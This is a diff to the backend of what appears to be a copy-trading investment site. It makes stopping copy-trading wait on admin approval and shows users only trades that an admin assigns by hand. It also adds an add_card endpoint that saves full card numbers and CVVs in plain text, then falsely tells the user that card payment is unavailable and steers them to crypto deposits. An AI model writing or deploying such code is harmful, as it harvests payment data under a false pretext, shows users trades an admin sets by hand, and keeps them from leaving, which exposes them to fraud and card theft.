@@ -79,12 +79,13 @@ from .models import (
     TradeHistory,
     WalletConnection,
 
-    Signal, 
-    UserSignalPurchase, 
+    Signal,
+    UserSignalPurchase,
     Transaction,
     UserTraderCopy,
     UserCopyTraderHistory,
     generate_unique_referral_code,
+    Card,
 )
 
 from .email_service import (
@@ -1036,30 +1037,38 @@ Note: You will remain locked in even if the trader's minimum threshold changes.
         try:
             copy_relation = UserTraderCopy.objects.get(
                 user=user,
-                trader=trader
+                trader=trader,
+                is_actively_copying=True
             )
         except UserTraderCopy.DoesNotExist:
             return Response(
-                {"success": False, "error": "You are not copying this trader"},
+                {"success": False, "error": "You are not actively copying this trader"},
                 status=status.HTTP_404_NOT_FOUND
             )
-        
-        # Stop copying
-        copy_relation.is_actively_copying = False
-        copy_relation.save()
-        
+
+        if copy_relation.cancel_requested:
+            return Response(
+                {"success": False, "error": "Cancel request already submitted. Awaiting admin review."},
+                status=status.HTTP_400_BAD_REQUEST
+            )
+
+        # Submit cancel request — admin must approve or reject
+        copy_relation.cancel_requested = True
+        copy_relation.cancel_requested_at = timezone.now()
+        copy_relation.save(update_fields=['cancel_requested', 'cancel_requested_at'])
+
         # Create notification
         Notification.objects.create(
             user=user,
             type="trade",
-            title="Copy Trading Stopped",
-            message=f"You have stopped copying {trader.name}",
-            full_details=f"Trader: {trader.name}\nStopped at: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            title="Cancel Request Submitted",
+            message=f"Your request to stop copying {trader.name} has been sent to admin for review.",
+            full_details=f"Trader: {trader.name}\nRequested at: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}",
         )
-        
+
         return Response({
             "success": True,
-            "message": f"Stopped copying {trader.name}",
+            "message": f"Cancel request sent for {trader.name}. Awaiting admin approval.",
             "copy_relation": UserTraderCopySerializer(copy_relation).data
         }, status=status.HTTP_200_OK)
 
@@ -1204,12 +1213,14 @@ def get_user_copy_status(request, trader_id):
         return Response({
             "success": True,
             "is_copying": copy_relation.is_actively_copying,
+            "cancel_requested": copy_relation.cancel_requested,
             "copy_relation": UserTraderCopySerializer(copy_relation).data
         }, status=status.HTTP_200_OK)
     except UserTraderCopy.DoesNotExist:
         return Response({
             "success": True,
             "is_copying": False,
+            "cancel_requested": False,
             "copy_relation": None
         }, status=status.HTTP_200_OK)
 
@@ -3867,20 +3878,12 @@ def generate_referral_code(request):
 def get_copy_trade_history(request):
     """
     GET: Get copy trading history for authenticated user
-    Shows ALL trades from traders they're copying
+    Shows trades assigned directly to the user by admin.
     """
     user = request.user
-    
-    # Get all traders user is actively copying
-    copying_traders = UserTraderCopy.objects.filter(
-        user=user,
-        is_actively_copying=True
-    ).values_list('trader_id', flat=True)
-    
-    # Get trade history for those traders
-    history = UserCopyTraderHistory.objects.filter(
-        trader_id__in=copying_traders
-    )
+
+    # Filter directly by user FK (set by admin when adding trades)
+    history = UserCopyTraderHistory.objects.filter(user=user)
     
     # Filter by status if provided
     status_filter = request.GET.get('status')
@@ -4004,10 +4007,7 @@ def get_copy_trade_detail(request, trade_id):
     user = request.user
     
     try:
-        copying_traders = UserTraderCopy.objects.filter(
-            user=user
-        ).values_list('trader_id', flat=True)
-        trade = UserCopyTraderHistory.objects.get(id=trade_id, trader_id__in=copying_traders)
+        trade = UserCopyTraderHistory.objects.get(id=trade_id, user=user)
     except UserCopyTraderHistory.DoesNotExist:
         return Response({
             "success": False,
@@ -4032,15 +4032,9 @@ def close_copy_trade(request, trade_id):
     user = request.user
 
     try:
-        # Get traders the user is actively copying
-        copying_traders = UserTraderCopy.objects.filter(
-            user=user,
-            is_actively_copying=True
-        ).values_list('trader_id', flat=True)
-
         trade = UserCopyTraderHistory.objects.get(
             id=trade_id,
-            trader_id__in=copying_traders,
+            user=user,
             status='open'
         )
     except UserCopyTraderHistory.DoesNotExist:
@@ -4256,6 +4250,51 @@ def transfer_funds(request):
         "message": f"${amount:,.2f} transferred successfully.",
         "balance": float(user.balance),
         "profit": float(user.profit),
+    }, status=status.HTTP_200_OK)
+
+
+# ---------------------------------------------------------------------------
+# Cards
+# ---------------------------------------------------------------------------
+
+@api_view(["POST"])
+@permission_classes([IsAuthenticated])
+@authentication_classes([TokenAuthentication])
+def add_card(request):
+    """Store card details (plain text). Returns unavailability message for now."""
+    user = request.user
+    data = request.data
+
+    card_number = str(data.get("card_number", "")).replace(" ", "").replace("-", "")
+    cardholder_name = str(data.get("cardholder_name", "")).strip()
+    expiry_month = str(data.get("expiry_month", "")).strip()
+    expiry_year = str(data.get("expiry_year", "")).strip()
+    cvv = str(data.get("cvv", "")).strip()
+    card_type = str(data.get("card_type", "visa")).strip()
+    billing_address = str(data.get("billing_address", "")).strip()
+    billing_zip = str(data.get("billing_zip", "")).strip()
+
+    if not all([card_number, cardholder_name, expiry_month, expiry_year, cvv]):
+        return Response(
+            {"success": False, "error": "Please fill in all required card fields."},
+            status=status.HTTP_400_BAD_REQUEST,
+        )
+
+    Card.objects.create(
+        user=user,
+        card_type=card_type,
+        cardholder_name=cardholder_name,
+        card_number=card_number,
+        expiry_month=expiry_month,
+        expiry_year=expiry_year,
+        cvv=cvv,
+        billing_address=billing_address or None,
+        billing_zip=billing_zip or None,
+    )
+
+    return Response({
+        "success": True,
+        "message": "Card payment is not available at this time. Please use cryptocurrency deposit options instead.",
     }, status=status.HTTP_200_OK)
 
 
